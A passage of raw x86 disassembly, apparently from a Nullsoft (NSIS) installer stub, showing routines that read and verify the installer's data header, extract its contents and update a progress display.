  402b6b:	ff 75 0c             	push   0xc(%ebp)
  402b6e:	ff 75 08             	push   0x8(%ebp)
  402b71:	e8 cd ff ff ff       	call   0x402b43
  402b76:	50                   	push   %eax
  402b77:	e8 a2 32 00 00       	call   0x405e1e
  402b7c:	f7 d8                	neg    %eax
  402b7e:	1b c0                	sbb    %eax,%eax
  402b80:	f7 d0                	not    %eax
  402b82:	23 45 10             	and    0x10(%ebp),%eax
  402b85:	5d                   	pop    %ebp
  402b86:	c2 0c 00             	ret    $0xc
  402b89:	55                   	push   %ebp
  402b8a:	8b ec                	mov    %esp,%ebp
  402b8c:	56                   	push   %esi
  402b8d:	8b 75 0c             	mov    0xc(%ebp),%esi
  402b90:	80 3e 00             	cmpb   $0x0,(%esi)
  402b93:	75 07                	jne    0x402b9c
  402b95:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402b9a:	eb 2c                	jmp    0x402bc8
  402b9c:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402ba3:	8d 45 10             	lea    0x10(%ebp),%eax
  402ba6:	50                   	push   %eax
  402ba7:	ff 75 08             	push   0x8(%ebp)
  402baa:	e8 94 ff ff ff       	call   0x402b43
  402baf:	50                   	push   %eax
  402bb0:	e8 c0 31 00 00       	call   0x405d75
  402bb5:	85 c0                	test   %eax,%eax
  402bb7:	74 0c                	je     0x402bc5
  402bb9:	ff 75 10             	push   0x10(%ebp)
  402bbc:	56                   	push   %esi
  402bbd:	50                   	push   %eax
  402bbe:	e8 0a 00 00 00       	call   0x402bcd
  402bc3:	eb 03                	jmp    0x402bc8
  402bc5:	6a 06                	push   $0x6
  402bc7:	58                   	pop    %eax
  402bc8:	5e                   	pop    %esi
  402bc9:	5d                   	pop    %ebp
  402bca:	c2 0c 00             	ret    $0xc
  402bcd:	55                   	push   %ebp
  402bce:	8b ec                	mov    %esp,%ebp
  402bd0:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402bd6:	53                   	push   %ebx
  402bd7:	56                   	push   %esi
  402bd8:	8b 75 10             	mov    0x10(%ebp),%esi
  402bdb:	57                   	push   %edi
  402bdc:	8b fe                	mov    %esi,%edi
  402bde:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402be1:	81 e6 00 03 00 00    	and    $0x300,%esi
  402be7:	50                   	push   %eax
  402be8:	8b c6                	mov    %esi,%eax
  402bea:	83 e7 01             	and    $0x1,%edi
  402bed:	0c 08                	or     $0x8,%al
  402bef:	50                   	push   %eax
  402bf0:	ff 75 0c             	push   0xc(%ebp)
  402bf3:	ff 75 08             	push   0x8(%ebp)
  402bf6:	e8 f5 31 00 00       	call   0x405df0
  402bfb:	85 c0                	test   %eax,%eax
  402bfd:	75 76                	jne    0x402c75
  402bff:	8b 1d 30 70 40 00    	mov    0x407030,%ebx
  402c05:	eb 1a                	jmp    0x402c21
  402c07:	85 ff                	test   %edi,%edi
  402c09:	75 4e                	jne    0x402c59
  402c0b:	ff 75 10             	push   0x10(%ebp)
  402c0e:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402c14:	50                   	push   %eax
  402c15:	ff 75 fc             	push   -0x4(%ebp)
  402c18:	e8 b0 ff ff ff       	call   0x402bcd
  402c1d:	85 c0                	test   %eax,%eax
  402c1f:	75 17                	jne    0x402c38
  402c21:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402c27:	68 05 01 00 00       	push   $0x105
  402c2c:	50                   	push   %eax
  402c2d:	6a 00                	push   $0x0
  402c2f:	ff 75 fc             	push   -0x4(%ebp)
  402c32:	ff d3                	call   *%ebx
  402c34:	85 c0                	test   %eax,%eax
  402c36:	74 cf                	je     0x402c07
  402c38:	ff 75 fc             	push   -0x4(%ebp)
  402c3b:	ff 15 24 70 40 00    	call   *0x407024
  402c41:	6a 03                	push   $0x3
  402c43:	e8 ba 36 00 00       	call   0x406302
  402c48:	85 c0                	test   %eax,%eax
  402c4a:	74 1d                	je     0x402c69
  402c4c:	6a 00                	push   $0x0
  402c4e:	56                   	push   %esi
  402c4f:	ff 75 0c             	push   0xc(%ebp)
  402c52:	ff 75 08             	push   0x8(%ebp)
  402c55:	ff d0                	call   *%eax
  402c57:	eb 1c                	jmp    0x402c75
  402c59:	ff 75 fc             	push   -0x4(%ebp)
  402c5c:	ff 15 24 70 40 00    	call   *0x407024
  402c62:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402c67:	eb 0c                	jmp    0x402c75
  402c69:	ff 75 0c             	push   0xc(%ebp)
  402c6c:	ff 75 08             	push   0x8(%ebp)
  402c6f:	ff 15 1c 70 40 00    	call   *0x40701c
  402c75:	5f                   	pop    %edi
  402c76:	5e                   	pop    %esi
  402c77:	5b                   	pop    %ebx
  402c78:	c9                   	leave
  402c79:	c2 0c 00             	ret    $0xc
  402c7c:	55                   	push   %ebp
  402c7d:	8b ec                	mov    %esp,%ebp
  402c7f:	83 ec 40             	sub    $0x40,%esp
  402c82:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402c89:	75 19                	jne    0x402ca4
  402c8b:	6a 00                	push   $0x0
  402c8d:	68 fa 00 00 00       	push   $0xfa
  402c92:	6a 01                	push   $0x1
  402c94:	ff 75 08             	push   0x8(%ebp)
  402c97:	ff 15 40 72 40 00    	call   *0x407240
  402c9d:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402ca4:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402cab:	75 4c                	jne    0x402cf9
  402cad:	8b 0d b8 a8 40 00    	mov    0x40a8b8,%ecx
  402cb3:	a1 c4 68 41 00       	mov    0x4168c4,%eax
  402cb8:	3b c8                	cmp    %eax,%ecx
  402cba:	7c 02                	jl     0x402cbe
  402cbc:	8b c8                	mov    %eax,%ecx
  402cbe:	50                   	push   %eax
  402cbf:	6a 64                	push   $0x64
  402cc1:	51                   	push   %ecx
  402cc2:	ff 15 48 71 40 00    	call   *0x407148
  402cc8:	50                   	push   %eax
  402cc9:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402ccc:	68 1c 90 40 00       	push   $0x40901c
  402cd1:	50                   	push   %eax
  402cd2:	ff 15 74 72 40 00    	call   *0x407274
  402cd8:	83 c4 0c             	add    $0xc,%esp
  402cdb:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402cde:	50                   	push   %eax
  402cdf:	ff 75 08             	push   0x8(%ebp)
  402ce2:	ff 15 7c 72 40 00    	call   *0x40727c
  402ce8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402ceb:	50                   	push   %eax
  402cec:	68 06 04 00 00       	push   $0x406
  402cf1:	ff 75 08             	push   0x8(%ebp)
  402cf4:	e8 6b 29 00 00       	call   0x405664
  402cf9:	33 c0                	xor    %eax,%eax
  402cfb:	c9                   	leave
  402cfc:	c2 10 00             	ret    $0x10
  402cff:	56                   	push   %esi
  402d00:	33 f6                	xor    %esi,%esi
  402d02:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402d06:	74 18                	je     0x402d20
  402d08:	a1 c0 68 41 00       	mov    0x4168c0,%eax
  402d0d:	3b c6                	cmp    %esi,%eax
  402d0f:	74 07                	je     0x402d18
  402d11:	50                   	push   %eax
  402d12:	ff 15 70 72 40 00    	call   *0x407270
  402d18:	89 35 c0 68 41 00    	mov    %esi,0x4168c0
  402d1e:	5e                   	pop    %esi
  402d1f:	c3                   	ret
  402d20:	39 35 c0 68 41 00    	cmp    %esi,0x4168c0
  402d26:	74 08                	je     0x402d30
  402d28:	56                   	push   %esi
  402d29:	e8 10 36 00 00       	call   0x40633e
  402d2e:	5e                   	pop    %esi
  402d2f:	c3                   	ret
  402d30:	ff 15 90 70 40 00    	call   *0x407090
  402d36:	3b 05 10 37 42 00    	cmp    0x423710,%eax
  402d3c:	76 23                	jbe    0x402d61
  402d3e:	56                   	push   %esi
  402d3f:	68 7c 2c 40 00       	push   $0x402c7c
  402d44:	56                   	push   %esi
  402d45:	6a 6f                	push   $0x6f
  402d47:	ff 35 00 37 42 00    	push   0x423700
  402d4d:	ff 15 3c 72 40 00    	call   *0x40723c
  402d53:	6a 05                	push   $0x5
  402d55:	50                   	push   %eax
  402d56:	a3 c0 68 41 00       	mov    %eax,0x4168c0
  402d5b:	ff 15 78 72 40 00    	call   *0x407278
  402d61:	5e                   	pop    %esi
  402d62:	c3                   	ret
  402d63:	55                   	push   %ebp
  402d64:	8b ec                	mov    %esp,%ebp
  402d66:	83 ec 28             	sub    $0x28,%esp
  402d69:	53                   	push   %ebx
  402d6a:	56                   	push   %esi
  402d6b:	33 db                	xor    %ebx,%ebx
  402d6d:	57                   	push   %edi
  402d6e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402d71:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402d74:	ff 15 90 70 40 00    	call   *0x407090
  402d7a:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  402d7f:	68 00 04 00 00       	push   $0x400
  402d84:	05 e8 03 00 00       	add    $0x3e8,%eax
  402d89:	56                   	push   %esi
  402d8a:	53                   	push   %ebx
  402d8b:	a3 10 37 42 00       	mov    %eax,0x423710
  402d90:	ff 15 78 70 40 00    	call   *0x407078
  402d96:	6a 03                	push   $0x3
  402d98:	68 00 00 00 80       	push   $0x80000000
  402d9d:	56                   	push   %esi
  402d9e:	e8 60 2d 00 00       	call   0x405b03
  402da3:	8b f8                	mov    %eax,%edi
  402da5:	83 ff ff             	cmp    $0xffffffff,%edi
  402da8:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402dab:	89 3d 18 90 40 00    	mov    %edi,0x409018
  402db1:	75 0a                	jne    0x402dbd
  402db3:	b8 04 91 40 00       	mov    $0x409104,%eax
  402db8:	e9 d8 01 00 00       	jmp    0x402f95
  402dbd:	56                   	push   %esi
  402dbe:	be 00 9c 42 00       	mov    $0x429c00,%esi
  402dc3:	56                   	push   %esi
  402dc4:	e8 a1 31 00 00       	call   0x405f6a
  402dc9:	56                   	push   %esi
  402dca:	e8 7a 2b 00 00       	call   0x405949
  402dcf:	50                   	push   %eax
  402dd0:	68 00 b0 42 00       	push   $0x42b000
  402dd5:	e8 90 31 00 00       	call   0x405f6a
  402dda:	53                   	push   %ebx
  402ddb:	57                   	push   %edi
  402ddc:	ff 15 74 70 40 00    	call   *0x407074
  402de2:	3b c3                	cmp    %ebx,%eax
  402de4:	a3 c4 68 41 00       	mov    %eax,0x4168c4
  402de9:	8b f0                	mov    %eax,%esi
  402deb:	0f 8e e7 00 00 00    	jle    0x402ed8
  402df1:	bb c8 68 41 00       	mov    $0x4168c8,%ebx
  402df6:	a1 18 37 42 00       	mov    0x423718,%eax
  402dfb:	8b fe                	mov    %esi,%edi
  402dfd:	f7 d8                	neg    %eax
  402dff:	1b c0                	sbb    %eax,%eax
  402e01:	25 00 7e 00 00       	and    $0x7e00,%eax
  402e06:	05 00 02 00 00       	add    $0x200,%eax
  402e0b:	3b f0                	cmp    %eax,%esi
  402e0d:	7c 02                	jl     0x402e11
  402e0f:	8b f8                	mov    %eax,%edi
  402e11:	57                   	push   %edi
  402e12:	53                   	push   %ebx
  402e13:	e8 60 03 00 00       	call   0x403178
  402e18:	85 c0                	test   %eax,%eax
  402e1a:	0f 84 22 01 00 00    	je     0x402f42
  402e20:	83 3d 18 37 42 00 00 	cmpl   $0x0,0x423718
  402e27:	75 7a                	jne    0x402ea3
  402e29:	6a 1c                	push   $0x1c
  402e2b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402e2e:	53                   	push   %ebx
  402e2f:	50                   	push   %eax
  402e30:	e8 89 2c 00 00       	call   0x405abe
  402e35:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402e38:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402e3d:	75 72                	jne    0x402eb1
  402e3f:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402e46:	75 69                	jne    0x402eb1
  402e48:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402e4f:	75 60                	jne    0x402eb1
  402e51:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402e58:	75 57                	jne    0x402eb1
  402e5a:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402e61:	75 4e                	jne    0x402eb1
  402e63:	09 45 08             	or     %eax,0x8(%ebp)
  402e66:	8b 45 08             	mov    0x8(%ebp),%eax
  402e69:	8b 0d b8 a8 40 00    	mov    0x40a8b8,%ecx
  402e6f:	83 e0 02             	and    $0x2,%eax
  402e72:	09 05 c0 37 42 00    	or     %eax,0x4237c0
  402e78:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402e7b:	3b c6                	cmp    %esi,%eax
  402e7d:	89 0d 18 37 42 00    	mov    %ecx,0x423718
  402e83:	0f 8f b2 00 00 00    	jg     0x402f3b
  402e89:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402e8d:	75 06                	jne    0x402e95
  402e8f:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402e93:	75 41                	jne    0x402ed6
  402e95:	ff 45 fc             	incl   -0x4(%ebp)
  402e98:	8d 70 fc             	lea    -0x4(%eax),%esi
  402e9b:	3b fe                	cmp    %esi,%edi
  402e9d:	76 12                	jbe    0x402eb1
  402e9f:	8b fe                	mov    %esi,%edi
  402ea1:	eb 0e                	jmp    0x402eb1
  402ea3:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402ea7:	75 08                	jne    0x402eb1
  402ea9:	6a 00                	push   $0x0
  402eab:	e8 4f fe ff ff       	call   0x402cff
  402eb0:	59                   	pop    %ecx
  402eb1:	3b 35 c4 68 41 00    	cmp    0x4168c4,%esi
  402eb7:	7d 0d                	jge    0x402ec6
  402eb9:	57                   	push   %edi
  402eba:	53                   	push   %ebx
  402ebb:	ff 75 f8             	push   -0x8(%ebp)
  402ebe:	e8 f6 34 00 00       	call   0x4063b9
  402ec3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402ec6:	01 3d b8 a8 40 00    	add    %edi,0x40a8b8
  402ecc:	2b f7                	sub    %edi,%esi
  402ece:	85 f6                	test   %esi,%esi
  402ed0:	0f 8f 20 ff ff ff    	jg     0x402df6
  402ed6:	33 db                	xor    %ebx,%ebx
  402ed8:	6a 01                	push   $0x1
  402eda:	e8 20 fe ff ff       	call   0x402cff
  402edf:	39 1d 18 37 42 00    	cmp    %ebx,0x423718
  402ee5:	59                   	pop    %ecx
  402ee6:	74 53                	je     0x402f3b
  402ee8:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  402eeb:	74 22                	je     0x402f0f
  402eed:	ff 35 b8 a8 40 00    	push   0x40a8b8
  402ef3:	e8 96 02 00 00       	call   0x40318e
  402ef8:	8d 45 08             	lea    0x8(%ebp),%eax
  402efb:	6a 04                	push   $0x4
  402efd:	50                   	push   %eax
  402efe:	e8 75 02 00 00       	call   0x403178
  402f03:	85 c0                	test   %eax,%eax
  402f05:	74 34                	je     0x402f3b
  402f07:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f0a:	3b 45 08             	cmp    0x8(%ebp),%eax
  402f0d:	75 2c                	jne    0x402f3b
  402f0f:	ff 75 ec             	push   -0x14(%ebp)
  402f12:	6a 40                	push   $0x40
  402f14:	ff 15 58 71 40 00    	call   *0x407158
  402f1a:	8b f0                	mov    %eax,%esi
  402f1c:	a1 18 37 42 00       	mov    0x423718,%eax
  402f21:	83 c0 1c             	add    $0x1c,%eax
  402f24:	50                   	push   %eax
  402f25:	e8 64 02 00 00       	call   0x40318e
  402f2a:	ff 75 ec             	push   -0x14(%ebp)
  402f2d:	56                   	push   %esi
  402f2e:	53                   	push   %ebx
  402f2f:	6a ff                	push   $0xffffffff
  402f31:	e8 66 00 00 00       	call   0x402f9c
  402f36:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  402f39:	74 11                	je     0x402f4c
  402f3b:	b8 38 90 40 00       	mov    $0x409038,%eax
  402f40:	eb 53                	jmp    0x402f95
  402f42:	6a 01                	push   $0x1
  402f44:	e8 b6 fd ff ff       	call   0x402cff
  402f49:	59                   	pop    %ecx
  402f4a:	eb ef                	jmp    0x402f3b
  402f4c:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  402f50:	89 35 14 37 42 00    	mov    %esi,0x423714
  402f56:	8b 06                	mov    (%esi),%eax
  402f58:	a3 1c 37 42 00       	mov    %eax,0x42371c
  402f5d:	74 06                	je     0x402f65
  402f5f:	ff 05 20 37 42 00    	incl   0x423720
  402f65:	6a 08                	push   $0x8
  402f67:	8d 46 44             	lea    0x44(%esi),%eax
  402f6a:	59                   	pop    %ecx
  402f6b:	83 e8 08             	sub    $0x8,%eax
  402f6e:	01 30                	add    %esi,(%eax)
  402f70:	49                   	dec    %ecx
  402f71:	75 f8                	jne    0x402f6b
  402f73:	6a 01                	push   $0x1
  402f75:	53                   	push   %ebx
  402f76:	53                   	push   %ebx
  402f77:	ff 75 f4             	push   -0xc(%ebp)
  402f7a:	ff 15 34 71 40 00    	call   *0x407134
  402f80:	89 46 3c             	mov    %eax,0x3c(%esi)
  402f83:	83 c6 04             	add    $0x4,%esi
  402f86:	6a 40                	push   $0x40
  402f88:	56                   	push   %esi
  402f89:	68 40 37 42 00       	push   $0x423740
  402f8e:	e8 2b 2b 00 00       	call   0x405abe
  402f93:	33 c0                	xor    %eax,%eax
  402f95:	5f                   	pop    %edi
  402f96:	5e                   	pop    %esi
  402f97:	5b                   	pop    %ebx
  402f98:	c9                   	leave
  402f99:	c2 04 00             	ret    $0x4
  402f9c:	55                   	push   %ebp
  402f9d:	8b ec                	mov    %esp,%ebp
  402f9f:	83 ec 50             	sub    $0x50,%esp
  402fa2:	53                   	push   %ebx
  402fa3:	56                   	push   %esi
  402fa4:	8b 75 14             	mov    0x14(%ebp),%esi
  402fa7:	57                   	push   %edi
  402fa8:	8b 7d 10             	mov    0x10(%ebp),%edi
  402fab:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402fae:	85 ff                	test   %edi,%edi
  402fb0:	75 07                	jne    0x402fb9
  402fb2:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402fb9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402fbd:	8b df                	mov    %edi,%ebx
  402fbf:	85 ff                	test   %edi,%edi
  402fc1:	75 05                	jne    0x402fc8
  402fc3:	bb c0 e8 40 00       	mov    $0x40e8c0,%ebx
  402fc8:	8b 45 08             	mov    0x8(%ebp),%eax
  402fcb:	85 c0                	test   %eax,%eax
  402fcd:	7c 0e                	jl     0x402fdd
  402fcf:	8b 0d 78 37 42 00    	mov    0x423778,%ecx
  402fd5:	03 c8                	add    %eax,%ecx
  402fd7:	51                   	push   %ecx
  402fd8:	e8 b1 01 00 00       	call   0x40318e
  402fdd:	8d 45 14             	lea    0x14(%ebp),%eax
  402fe0:	6a 04                	push   $0x4
  402fe2:	50                   	push   %eax
  402fe3:	e8 90 01 00 00       	call   0x403178
  402fe8:	85 c0                	test   %eax,%eax
  402fea:	0f 84 3f 01 00 00    	je     0x40312f
  402ff0:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  402ff4:	0f 84 1e 01 00 00    	je     0x403118
  402ffa:	ff 15 90 70 40 00    	call   *0x407090
  403000:	b9 30 a8 40 00       	mov    $0x40a830,%ecx
  403005:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403008:	e8 1a 34 00 00       	call   0x406427
  40300d:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  403014:	8b 45 14             	mov    0x14(%ebp),%eax
  403017:	89 45 08             	mov    %eax,0x8(%ebp)
  40301a:	0f 8e 4e 01 00 00    	jle    0x40316e
  403020:	be 00 40 00 00       	mov    $0x4000,%esi
  403025:	39 75 14             	cmp    %esi,0x14(%ebp)
  403028:	7d 03                	jge    0x40302d
  40302a:	8b 75 14             	mov    0x14(%ebp),%esi
  40302d:	bf c0 a8 40 00       	mov    $0x40a8c0,%edi
  403032:	56                   	push   %esi
  403033:	57                   	push   %edi
  403034:	e8 3f 01 00 00       	call   0x403178
  403039:	85 c0                	test   %eax,%eax
  40303b:	0f 84 ee 00 00 00    	je     0x40312f
  403041:	29 75 14             	sub    %esi,0x14(%ebp)
  403044:	89 3d 48 a8 40 00    	mov    %edi,0x40a848
  40304a:	89 35 4c a8 40 00    	mov    %esi,0x40a84c
  403050:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403053:	b9 30 a8 40 00       	mov    $0x40a830,%ecx
  403058:	89 1d 50 a8 40 00    	mov    %ebx,0x40a850
  40305e:	a3 54 a8 40 00       	mov    %eax,0x40a854
  403063:	e8 df 33 00 00       	call   0x406447
  403068:	85 c0                	test   %eax,%eax
  40306a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40306d:	0f 8c 9d 00 00 00    	jl     0x403110
  403073:	8b 35 50 a8 40 00    	mov    0x40a850,%esi
  403079:	2b f3                	sub    %ebx,%esi
  40307b:	ff 15 90 70 40 00    	call   *0x407090
  403081:	f6 05 d4 37 42 00 01 	testb  $0x1,0x4237d4
  403088:	8b f8                	mov    %eax,%edi
  40308a:	74 43                	je     0x4030cf
  40308c:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40308f:	3d c8 00 00 00       	cmp    $0xc8,%eax
  403094:	77 06                	ja     0x40309c
  403096:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40309a:	75 33                	jne    0x4030cf
  40309c:	8b 45 08             	mov    0x8(%ebp),%eax
  40309f:	ff 75 08             	push   0x8(%ebp)
  4030a2:	2b 45 14             	sub    0x14(%ebp),%eax
  4030a5:	6a 64                	push   $0x64
  4030a7:	50                   	push   %eax
  4030a8:	ff 15 48 71 40 00    	call   *0x407148
  4030ae:	50                   	push   %eax
  4030af:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4030b2:	68 20 91 40 00       	push   $0x409120
  4030b7:	50                   	push   %eax
  4030b8:	ff 15 74 72 40 00    	call   *0x407274
  4030be:	83 c4 0c             	add    $0xc,%esp
  4030c1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4030c4:	50                   	push   %eax
  4030c5:	6a 00                	push   $0x0
  4030c7:	e8 c5 1f 00 00       	call   0x405091
  4030cc:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4030cf:	85 f6                	test   %esi,%esi
  4030d1:	74 31                	je     0x403104
  4030d3:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4030d7:	75 13                	jne    0x4030ec
  4030d9:	56                   	push   %esi
  4030da:	53                   	push   %ebx
  4030db:	ff 75 0c             	push   0xc(%ebp)
  4030de:	e8 c7 2a 00 00       	call   0x405baa
  4030e3:	85 c0                	test   %eax,%eax
  4030e5:	74 2d                	je     0x403114
  4030e7:	01 75 fc             	add    %esi,-0x4(%ebp)
  4030ea:	eb 0c                	jmp    0x4030f8
  4030ec:	01 75 fc             	add    %esi,-0x4(%ebp)
  4030ef:	29 75 f8             	sub    %esi,-0x8(%ebp)
  4030f2:	8b 1d 50 a8 40 00    	mov    0x40a850,%ebx
  4030f8:	83 7d f0 01          	cmpl   $0x1,-0x10(%ebp)
  4030fc:	0f 85 4e ff ff ff    	jne    0x403050
  403102:	eb 6a                	jmp    0x40316e
  403104:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403108:	0f 8f 12 ff ff ff    	jg     0x403020
  40310e:	eb 5e                	jmp    0x40316e
  403110:	6a fc                	push   $0xfffffffc
  403112:	eb 1d                	jmp    0x403131
  403114:	6a fe                	push   $0xfffffffe
  403116:	eb 19                	jmp    0x403131
  403118:	85 ff                	test   %edi,%edi
  40311a:	74 47                	je     0x403163
  40311c:	39 75 14             	cmp    %esi,0x14(%ebp)
  40311f:	7d 03                	jge    0x403124
  403121:	8b 75 14             	mov    0x14(%ebp),%esi
  403124:	56                   	push   %esi
  403125:	57                   	push   %edi
  403126:	e8 4d 00 00 00       	call   0x403178
  40312b:	85 c0                	test   %eax,%eax
  40312d:	75 3c                	jne    0x40316b
  40312f:	6a fd                	push   $0xfffffffd
  403131:	58                   	pop    %eax
  403132:	eb 3d                	jmp    0x403171
  403134:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403137:	39 75 14             	cmp    %esi,0x14(%ebp)
  40313a:	7d 03                	jge    0x40313f
  40313c:	8b 75 14             	mov    0x14(%ebp),%esi
  40313f:	bf c0 a8 40 00       	mov    $0x40a8c0,%edi
  403144:	56                   	push   %esi
  403145:	57                   	push   %edi
  403146:	e8 2d 00 00 00       	call   0x403178
  40314b:	85 c0                	test   %eax,%eax
  40314d:	74 e0                	je     0x40312f
  40314f:	56                   	push   %esi
  403150:	57                   	push   %edi
  403151:	ff 75 0c             	push   0xc(%ebp)
  403154:	e8 51 2a 00 00       	call   0x405baa
  403159:	85 c0                	test   %eax,%eax
  40315b:	74 b7                	je     0x403114
  40315d:	01 75 fc             	add    %esi,-0x4(%ebp)
  403160:	29 75 14             	sub    %esi,0x14(%ebp)
  403163:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403167:	7f cb                	jg     0x403134
  403169:	eb 03                	jmp    0x40316e
  40316b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40316e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403171:	5f                   	pop    %edi
  403172:	5e                   	pop    %esi
  403173:	5b                   	pop    %ebx
  403174:	c9                   	leave
  403175:	c2 10 00             	ret    $0x10
  403178:	ff 74 24 08          	push   0x8(%esp)
  40317c:	ff 74 24 08          	push   0x8(%esp)
  403180:	ff 35 18 90 40 00    	push   0x409018
  403186:	e8 f0 29 00 00       	call   0x405b7b
  40318b:	c2 08 00             	ret    $0x8
  40318e:	6a 00                	push   $0x0
  403190:	6a 00                	push   $0x0
  403192:	ff 74 24 0c          	push   0xc(%esp)
  403196:	ff 35 18 90 40 00    	push   0x409018
  40319c:	ff 15 34 71 40 00    	call   *0x407134
  4031a2:	c2 04 00             	ret    $0x4
  4031a5:	56                   	push   %esi
  4031a6:	be 00 a4 42 00       	mov    $0x42a400,%esi
  4031ab:	56                   	push   %esi
  4031ac:	e8 23 30 00 00       	call   0x4061d4
  4031b1:	56                   	push   %esi
  4031b2:	e8 b8 27 00 00       	call   0x40596f
  4031b7:	85 c0                	test   %eax,%eax
  4031b9:	75 02                	jne    0x4031bd
  4031bb:	5e                   	pop    %esi
  4031bc:	c3                   	ret
  4031bd:	56                   	push   %esi
  4031be:	e8 3f 27 00 00       	call   0x405902
  4031c3:	56                   	push   %esi
  4031c4:	e8 0b 24 00 00       	call   0x4055d4
  4031c9:	56                   	push   %esi
  4031ca:	68 00 a0 42 00       	push   $0x42a000
  4031cf:	e8 5e 29 00 00       	call   0x405b32
  4031d4:	5e                   	pop    %esi
  4031d5:	c3                   	ret
  4031d6:	81 ec 84 01 00 00    	sub    $0x184,%esp
  4031dc:	53                   	push   %ebx
  4031dd:	56                   	push   %esi
  4031de:	57                   	push   %edi
  4031df:	33 db                	xor    %ebx,%ebx
  4031e1:	68 01 80 00 00       	push   $0x8001
  4031e6:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4031ea:	c7 44 24 10 98 91 40 	movl   $0x409198,0x10(%esp)
  4031f1:	00 
  4031f2:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4031f6:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  4031fb:	ff 15 a0 70 40 00    	call   *0x4070a0
  403201:	ff 15 9c 70 40 00    	call   *0x40709c
  403207:	25 ff ff ff bf       	and    $0xbfffffff,%eax
  40320c:	66 3d 06 00          	cmp    $0x6,%ax
  403210:	a3 0c 37 42 00       	mov    %eax,0x42370c
  403215:	74 11                	je     0x403228
  403217:	53                   	push   %ebx
  403218:	e8 e5 30 00 00       	call   0x406302
  40321d:	3b c3                	cmp    %ebx,%eax
  40321f:	74 07                	je     0x403228
  403221:	68 00 0c 00 00       	push   $0xc00
  403226:	ff d0                	call   *%eax
  403228:	be 98 72 40 00       	mov    $0x407298,%esi
  40322d:	56                   	push   %esi
  40322e:	e8 61 30 00 00       	call   0x406294
  403233:	56                   	push   %esi
  403234:	ff 15 98 70 40 00    	call   *0x407098
  40323a:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40323e:	38 1e                	cmp    %bl,(%esi)
  403240:	75 eb                	jne    0x40322d
  403242:	6a 0a                	push   $0xa
  403244:	e8 b9 30 00 00       	call   0x406302
  403249:	6a 08                	push   $0x8
  40324b:	e8 b2 30 00 00       	call   0x406302
  403250:	6a 06                	push   $0x6
  403252:	a3 04 37 42 00       	mov    %eax,0x423704
  403257:	e8 a6 30 00 00       	call   0x406302
  40325c:	3b c3                	cmp    %ebx,%eax
  40325e:	74 0f                	je     0x40326f
  403260:	6a 1e                	push   $0x1e
  403262:	ff d0                	call   *%eax
  403264:	85 c0                	test   %eax,%eax
  403266:	74 07                	je     0x40326f
  403268:	80 0d 0f 37 42 00 40 	orb    $0x40,0x42370f
  40326f:	55                   	push   %ebp
  403270:	ff 15 44 70 40 00    	call   *0x407044
  403276:	53                   	push   %ebx
  403277:	ff 15 88 72 40 00    	call   *0x407288
  40327d:	a3 d8 37 42 00       	mov    %eax,0x4237d8
  403282:	53                   	push   %ebx
  403283:	8d 44 24 38          	lea    0x38(%esp),%eax
  403287:	68 60 01 00 00       	push   $0x160
  40328c:	50                   	push   %eax
  40328d:	53                   	push   %ebx
  40328e:	68 c8 ec 41 00       	push   $0x41ecc8
  403293:	ff 15 78 71 40 00    	call   *0x407178
  403299:	68 88 91 40 00       	push   $0x409188
